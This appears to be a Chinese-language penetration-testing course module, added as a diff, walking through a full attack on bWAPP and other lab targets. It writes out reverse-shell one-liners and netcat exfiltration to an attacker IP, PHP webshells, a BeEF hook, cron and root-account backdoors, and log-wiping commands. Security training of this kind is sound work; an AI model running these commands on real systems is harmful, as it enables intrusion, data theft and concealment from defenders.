@@ -1,0 +1,564 @@
+================================================================================
+模块 08：Web渗透综合实战
+================================================================================
+模块标题：红队出击 — 从信息收集到Getshell的完整渗透测试流程
+学习目标：
+  1. 掌握完整的Web渗透测试方法论和工作流程
+  2. 能独立完成从侦察→扫描→利用→后渗透的全链条攻击
+  3. 熟练使用多种工具的协同配合
+  4. 理解WAF/IDS环境下的攻击策略调整
+  5. 掌握手动利用与自动化工具的平衡
+  6. 能编写专业的渗透测试报告
+工具分类：综合实战 (全工具链)
+推荐工具：所有前序模块的工具
+优先级：★★★★★ (综合能力检验，实战导向)
+================================================================================
+
+============================================================
+第一部分：完整渗透测试方法论
+============================================================
+
+【1.1 渗透测试标准框架】
+
+笔者推荐使用PTES (Penetration Testing Execution Standard) 框架：
+
+  阶段0: 前期准备 (Pre-engagement)
+    - 签署授权书和保密协议
+    - 明确测试范围 (IP范围/域名/排除项)
+    - 确定测试时间窗口
+    - 确定联系方式 (出现问题时)
+    - 确定报告交付要求
+
+  阶段1: 信息收集 (Intelligence Gathering)
+    工具: whatweb, wpscan, joomscan, dirb, gobuster
+    产出: 目标技术栈、目录结构、攻击面分析
+
+  阶段2: 威胁建模 (Threat Modeling)
+    分析: 哪些漏洞可能被利用，攻击路径优先级
+
+  阶段3: 漏洞分析 (Vulnerability Analysis)
+    工具: nikto, ZAP, arachni, skipfish
+    产出: 确认的漏洞列表
+
+  阶段4: 漏洞利用 (Exploitation)
+    工具: sqlmap, commix, beef, burpsuite, Metasploit
+    目标: 获取初始访问权限 (Initial Access)
+
+  阶段5: 后渗透 (Post Exploitation)
+    目标: 权限提升、内网横向移动、数据提取
+
+  阶段6: 报告 (Reporting)
+    产出: 专业渗透测试报告
+
+【1.2 攻击路径规划】
+
+典型的攻击链路:
+
+  路径A: 信息收集 → SQL注入 → 获取凭证 → 登录后台 → 上传WebShell
+  路径B: 信息收集 → 弱口令 → 登录后台 → 功能利用 → RCE
+  路径C: 信息收集 → XSS → Cookie窃取 → 会话劫持 → 越权操作
+  路径D: 信息收集 → LFI → 日志注入 → RCE → 反弹Shell
+  路径E: 信息收集 → 文件上传 → WebShell → 反弹Shell
+  路径F: 信息收集 → 命令注入 → 反弹Shell → 内网横向
+
+选择最优路径的原则:
+  1. 成功率高 (低风险、高成功率)
+  2. 隐蔽性好 (不易被检测)
+  3. 最短路径 (最快达到目标)
+  4. 影响最小 (不破坏目标系统)
+
+============================================================
+第二部分：实战环境搭建
+============================================================
+
+【2.1 推荐靶机环境】
+
+在ArchStrike中搭建以下靶机进行综合实战练习:
+
+靶机1: DVWA (Damn Vulnerable Web Application)
+  用途: SQL注入, XSS, CSRF, 命令注入, 文件包含, 文件上传, 暴力破解
+  难度: Low to High
+  安装: 通常已预装或Docker
+
+靶机2: bWAPP (buggy Web Application)
+  用途: 超过100种Web漏洞
+  安装:
+    # Docker方式:
+    docker pull raesene/bwapp
+    docker run -d -p 8080:80 raesene/bwapp
+  访问: http://localhost:8080/install.php → 点击install
+  默认凭据: bee / bug
+
+靶机3: Metasploitable 2 (如有虚拟机环境)
+  用途: 完整的脆弱系统, 含Web+系统漏洞
+  安装: 下载OVA导入VirtualBox/VMware
+
+靶机4: OWASP WebGoat
+  用途: OWASP官方教学靶场
+  安装:
+    docker pull webgoat/goatandwolf
+    docker run -d -p 8080:8080 -p 9090:9090 webgoat/goatandwolf
+  访问: http://localhost:8080/WebGoat
+
+靶机5: PentesterLab 练习 (在线/ISO)
+  用途: 从简单到困难的实战挑战
+  网址: https://pentesterlab.com/exercises
+
+【2.2 实验环境网络架构】
+
+  ┌──────────────────┐
+  │   攻击机(Arch)    │  192.168.1.100
+  │  burpsuite       │
+  │  sqlmap          │
+  │  commix          │
+  │  beef-xss        │
+  │  whatweb/dirb    │
+  │  nikto/zap       │
+  └──────┬───────────┘
+         │
+  ┌──────▼───────────┐
+  │   靶机网络        │
+  │  DVWA:80         │  192.168.1.200
+  │  bWAPP:80        │  192.168.1.201
+  │  WebGoat:8080    │  192.168.1.202
+  └──────────────────┘
+
+============================================================
+第三部分：综合实战 — 对bWAPP的完整渗透
+============================================================
+
+【实战目标】
+  对bWAPP靶机进行完整的渗透测试，从信息收集到获取Shell。
+
+【阶段一: 信息收集与侦察】
+
+Step 1: 确定目标
+  目标: http://bwapp.local (或 http://192.168.1.201)
+  
+Step 2: 手动浏览目标网站
+  打开Firefox
+  访问: http://bwapp.local/login.php
+  默认凭据: bee / bug (记录以备后续使用)
+  浏览网站页面，了解功能和结构
+  查看: robots.txt, 页面源代码
+
+Step 3: 使用whatweb识别技术栈
+  终端:
+  whatweb -a 3 -v http://bwapp.local
+  
+  记录发现:
+  [*] Web服务器: Apache/2.x
+  [*] 后端语言: PHP/5.x
+  [*] 框架: 无标准CMS, 自定义PHP应用
+  [*] JavaScript: 无特殊框架
+
+Step 4: 使用dirb和gobuster目录爆破
+  终端:
+  dirb http://bwapp.local /usr/share/dirb/wordlists/common.txt
+  
+  记录发现:
+  + /admin/ (CODE:403)
+  + /images/ (CODE:301)
+  + /passwords/ (CODE:403)
+  + /documents/ (CODE:200)
+  + /robots.txt (CODE:200)
+  + /phpinfo.php (CODE:200) ← 重点发现！
+  + /config/ (CODE:403)
+
+  使用gobuster补充:
+  gobuster dir -u http://bwapp.local -w /usr/share/wordlists/dirb/big.txt -x php,txt,bak,old
+
+Step 5: 使用nikto进行漏洞扫描
+  终端:
+  nikto -h http://bwapp.local -o nikto_bwapp.html -Format html
+  
+  记录关键发现:
+  - /phpinfo.php → PHP版本信息披露
+  - /config/ → 可能存在配置文件
+  - 安全头缺失
+  - 目录索引开启
+
+Step 6: 整理侦察结果
+  创建文件: recon_bwapp.txt
+  
+  ========================
+  bWAPP 信息收集报告
+  URL: http://bwapp.local
+  Web服务器: Apache
+  后端语言: PHP
+  已知凭据: bee/bug
+  功能点: 登录、搜索、多种漏洞页面
+  敏感路径:
+  - /phpinfo.php (PHP配置信息)
+  - /config/ (403)
+  - /passwords/ (403)
+  - /documents/ (200)
+  攻击面: 
+  - 登录表单 → 暴力破解/SQL注入
+  - 搜索功能 → XSS/SQL注入
+  - 多种漏洞练习页面 → 直接可利用
+  ========================
+
+【阶段二: 漏洞分析】
+
+Step 1: 使用ZAP进行被动扫描
+  1. 启动ZAP: zaproxy
+  2. 设置Firefox代理: 127.0.0.1:8080
+  3. 浏览bWAPP所有页面 (特别是登录后)
+  4. 在ZAP中查看Alerts
+
+Step 2: 使用ZAP主动扫描关键页面
+  1. 在ZAP的Sites树中右键关键URL
+  2. Attack → Active Scan
+  3. 等待扫描完成
+  4. 分析发现的高危/中危漏洞
+
+Step 3: 手工测试关键漏洞
+  基于信息收集，优先测试:
+
+  3a) SQL注入测试:
+    搜索功能: 输入 1' 观察错误
+    登录页面: admin' --
+  
+  3b) XSS测试:
+    搜索功能: <script>alert(1)</script>
+    留言/反馈功能: <img src=x onerror=alert(1)>
+  
+  3c) 文件包含测试:
+    有page参数的URL: ?page=../../../../etc/passwd
+  
+  3d) 命令注入测试:
+    ping功能: 127.0.0.1;whoami
+
+【阶段三: 漏洞利用】
+
+路径1: 如果发现SQL注入
+
+Step 1: 使用sqlmap
+  sqlmap -u "http://bwapp.local/sqli_1.php?title=1&action=search" \
+         --cookie="PHPSESSID=xxx; security_level=0" --dbs
+
+Step 2: 获取数据库信息
+  sqlmap -u "URL" --cookie="..." -D bWAPP --tables
+
+Step 3: 获取用户表数据
+  sqlmap -u "URL" --cookie="..." -D bWAPP -T users -C login,password --dump
+
+Step 4: 使用获取的凭据登录
+
+路径2: 如果发现命令注入
+
+Step 1: 确认命令注入
+  输入: 127.0.0.1;whoami
+  观察: 返回 www-data
+
+Step 2: 使用commix
+  commix --url="http://bwapp.local/commandi.php" \
+         --data="target=127.0.0.1&form=submit" \
+         --cookie="PHPSESSID=xxx; security_level=0"
+
+Step 3: 获取交互式Shell
+  选择 Y 获取伪终端
+  commix > whoami
+  
+Step 4: 获取反向Shell
+  攻击机: nc -lvnp 4444
+  commix > bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+路径3: 如果发现XSS
+
+Step 1: 启动BeEF
+  sudo beef-xss
+
+Step 2: 注入Hook (在存储型XSS中)
+  <script src="http://192.168.1.100:3000/hook.js"></script>
+
+Step 3: 在BeEF面板中利用
+  - 获取Cookie
+  - 窃取会话
+  - 钓鱼攻击
+
+路径4: 如果发现文件上传
+
+Step 1: 创建PHP Webshell
+  echo '<?php system($_GET["cmd"]); ?>' > /home/a/shell.php
+
+Step 2: 上传 (bWAPP的Unrestricted File Upload)
+  选择文件 → Upload
+
+Step 3: 访问Webshell
+  curl "http://bwapp.local/images/shell.php?cmd=whoami"
+
+Step 4: 获取反向Shell
+  curl "http://bwapp.local/images/shell.php?cmd=nc%20-e%20/bin/sh%20192.168.1.100%204444"
+
+【阶段四: 后渗透 (Post Exploitation)】
+
+假设已获得初始shell (www-data用户)
+
+Step 1: 信息收集 (权限内)
+  whoami                    → 确认当前用户
+  id                        → 查看用户ID和组
+  uname -a                  → 系统信息
+  cat /etc/os-release       → 发行版信息
+  lsb_release -a            → 发行版详细信息
+  hostname                  → 主机名
+  ifconfig / ip addr        → 网络配置
+  netstat -tlnp             → 监听端口 (需要root权限)
+  ss -tlnp                  → 监听端口
+  ps aux                    → 进程列表
+  crontab -l                → 计划任务
+  cat /etc/passwd           → 本地用户列表
+  cat /etc/shadow           → 密码哈希 (需要root)
+
+Step 2: 查找敏感文件
+  find /var/www/ -name "config*" 2>/dev/null
+  find /var/www/ -name "*.conf" 2>/dev/null
+  find / -name "wp-config.php" 2>/dev/null
+  find / -name ".env" 2>/dev/null
+  find / -type f -name "*.sql" 2>/dev/null
+  find / -type f -name "*.pem" 2>/dev/null
+  find / -type f -name "*id_rsa" 2>/dev/null
+
+Step 3: 权限提升 (Linux提权)
+  
+  3a) SUID提权:
+  find / -perm -4000 -type f 2>/dev/null
+  → 寻找可利用的SUID二进制文件
+  
+  3b) Sudo提权:
+  sudo -l
+  → 列出可sudo执行的命令
+  
+  3c) Cron提权:
+  cat /etc/crontab
+  ls -la /etc/cron.d/
+  → 寻找可写的计划任务脚本
+  
+  3d) 内核提权:
+  uname -a
+  → 搜索对应版本的exploit (如DirtyCow, OverlayFS)
+  
+  3e) 配置错误:
+  cat /etc/sudoers
+  cat /etc/passwd | grep -v nologin
+  
+  3f) 密码复用:
+  find / -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null
+  find / -name "*.php" -exec grep -l "password" {} \; 2>/dev/null
+
+Step 4: 维持访问 (Persistence)
+
+  4a) SSH密钥:
+  echo "ssh-rsa AAAA..." >> /home/user/.ssh/authorized_keys
+  chmod 600 /home/user/.ssh/authorized_keys
+
+  4b) Cron后门:
+  echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/5555 0>&1'" \
+    >> /etc/crontab
+
+  4c) PHP WebShell:
+  echo '<?php @eval($_POST["x"]); ?>' > /var/www/html/.hidden.php
+
+  4d) 添加root账户:
+  echo "backdoor::0:0:root:/root:/bin/bash" >> /etc/passwd
+  或: useradd -u 0 -o -g 0 backdoor
+
+Step 5: 内网横向移动
+
+  5a) 探测内网:
+  for i in $(seq 1 254); do
+    ping -c 1 -W 1 192.168.1.$i | grep "ttl" &
+  done
+
+  5b) 端口扫描 (使用bash):
+  for port in 22 80 443 445 3306 3389 8080; do
+    (echo >/dev/tcp/192.168.1.x/$port) 2>/dev/null && echo "$port open"
+  done
+
+  5c) SSH隧道 (将流量导入内网):
+  ssh -D 9050 user@target
+  → 配置proxychains进行内网穿透
+
+  5d) 凭证复用:
+  cat /var/www/html/config.php → 数据库密码
+  → 尝试连接内网MySQL/PostgreSQL
+
+Step 6: 数据提取 (Data Exfiltration)
+
+  6a) 压缩敏感文件:
+  tar -czf /tmp/data.tar.gz /var/www/html/
+
+  6b) 通过HTTP外传:
+  python3 -m http.server 9999 --directory /tmp/
+  攻击机: wget http://target:9999/data.tar.gz
+
+  6c) 通过DNS外传 (绕过出站限制):
+  分片传输: 使用dnscat2或自写脚本
+
+  6d) 通过Netcat:
+  nc -w 3 192.168.1.100 4444 < /tmp/data.tar.gz
+  攻击机: nc -lvnp 4444 > data.tar.gz
+
+Step 7: 痕迹清除
+
+  7a) 清除命令历史:
+  unset HISTFILE
+  history -c
+  rm -f ~/.bash_history
+  echo > ~/.bash_history
+
+  7b) 清除日志 (需要root):
+  echo > /var/log/auth.log
+  echo > /var/log/syslog
+  echo > /var/log/apache2/access.log
+  echo > /var/log/apache2/error.log
+  
+  7c) 覆盖删除文件:
+  shred -zu /tmp/exploit_file
+
+  7d) 清除WebShell:
+  rm -f /var/www/html/.hidden.php
+  rm -f /var/www/html/shell.txt
+
+【阶段五: 汇报与报告】
+
+Step 1: 渗透测试报告结构
+
+  1. 执行摘要 (Executive Summary)
+     - 测试目的
+     - 总体风险评级
+     - 关键发现摘要
+     - 建议优先级
+
+  2. 测试方法 (Methodology)
+     - 测试阶段说明
+     - 工具列表
+     - 测试时间线
+
+  3. 详细发现 (Findings)
+     每个漏洞包括:
+     - 漏洞名称和描述
+     - CVSS评分
+     - 风险等级 (严重/高/中/低)
+     - 复现步骤
+     - POC代码/截图
+     - 影响分析
+     - 修复建议
+     - 参考链接 (CVE, OWASP)
+
+  4. 漏洞列表 (按严重度排序)
+     ┌──────┬────────────┬────────┬──────┐
+     │ 编号  │ 漏洞       │ 等级   │ 状态  │
+     ├──────┼────────────┼────────┼──────┤
+     │ V-01 │ SQL注入     │ 严重   │ 已确认│
+     │ V-02 │ 命令注入    │ 严重   │ 已确认│
+     │ V-03 │ 文件上传RCE │ 严重   │ 已利用│
+     │ V-04 │ XSS存储型   │ 高     │ 已确认│
+     │ V-05 │ 信息泄露    │ 中     │ 已确认│
+     │ V-06 │ 安全头缺失  │ 低     │ 已确认│
+     └──────┴────────────┴────────┴──────┘
+
+  5. 攻击路径图
+     信息收集 → SQL注入 → 获取密码哈希 → 破解密码
+     → 登录后台 → 文件上传 → WebShell → 提权 → root
+
+  6. 修复建议 (按优先级)
+
+  7. 附录
+     - 工具输出日志
+     - 扫描报告
+     - 截图详细
+
+============================================================
+第四部分：手工测试 vs 自动化工具
+
+【4.1 何时手工测试】
+
+  ✓ 复杂逻辑漏洞 (业务逻辑、权限绕过)
+  ✓ 认证/会话相关漏洞
+  ✓ WAF/IDS拦截了自动化工具
+  ✓ 需要理解业务上下文
+  ✓ Token/签名相关的漏洞
+  ✓ CSRF (需要理解表单结构)
+  ✓ IDOR (需要理解参数含义)
+  ✓ 多步骤流程中的漏洞
+
+【4.2 何时使用自动化工具】
+
+  ✓ 大规模资产扫描 (nikto, ZAP)
+  ✓ SQL注入检测 (sqlmap)
+  ✓ 命令注入检测 (commix)
+  ✓ 目录爆破 (dirb, gobuster)
+  ✓ 指纹识别 (whatweb)
+  ✓ XSS大规模检测 (xsstrike, xsser)
+  ✓ 重复性任务
+  ✓ 已知漏洞检测 (wpscan, joomscan)
+
+【4.3 最佳实践: 手工+自动化结合】
+
+  流程:
+  1. 自动扫描 (广度覆盖) → 产生候选漏洞列表
+  2. 手工验证 (深度确认) → 确认漏洞存在性
+  3. 自动利用 (效率) → 利用已知技术
+  4. 手工精细化 (定制化) → 绕过复杂防护
+
+============================================================
+第五部分：综合工具链速查
+
+【渗透测试常用命令速查】
+
+# 侦察阶段
+whatweb -a 3 http://target.com
+wpscan --url http://target.com --enumerate u,p,vp
+dirb http://target.com /usr/share/dirb/wordlists/common.txt
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt
+
+# 扫描阶段
+nikto -h http://target.com -o nikto.html -Format html
+wafw00f http://target.com
+zaproxy -cmd -quickurl http://target.com -quickprogress -quickout zap_report.html
+
+# SQL注入
+sqlmap -u "URL" --dbs
+sqlmap -u "URL" -D db --tables
+sqlmap -u "URL" -D db -T table --dump
+sqlmap -u "URL" --os-shell --tamper=space2comment
+
+# 命令注入
+commix --url="URL" --data="param=value"
+commix --url="URL" --batch --os-shell
+
+# XSS
+xsser --url "URL" --auto
+xsstrike -u "URL"
+sudo beef-xss
+
+# 会话/认证
+burpsuite → Intruder → Cluster Bomb
+curl -b "PHPSESSID=xxx" http://target.com
+
+# 后渗透 (反弹Shell)
+nc -lvnp 4444
+bash -i >& /dev/tcp/IP/PORT 0>&1
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 提权
+find / -perm -4000 -type f 2>/dev/null
+sudo -l
+uname -a → search exploit
+
+================================================================================
+模块小结
+================================================================================
+
+完成本模块后你应该能够：
+  ✓ 遵循完整的渗透测试方法论
+  ✓ 独立完成从侦察到GetShell的完整攻击链
+  ✓ 在多工具间协同切换，选择最优攻击路径
+  ✓ 进行基本的后渗透操作 (权限维持、横向移动)
+  ✓ 编写专业的渗透测试报告
+  ✓ 理解手工测试与自动化工具的分工配合
+  ✓ 在多种靶机环境中验证和学习
+
+下一模块预告：09-WAF绕过与高级技巧 — WAF检测绕过与高级渗透技术
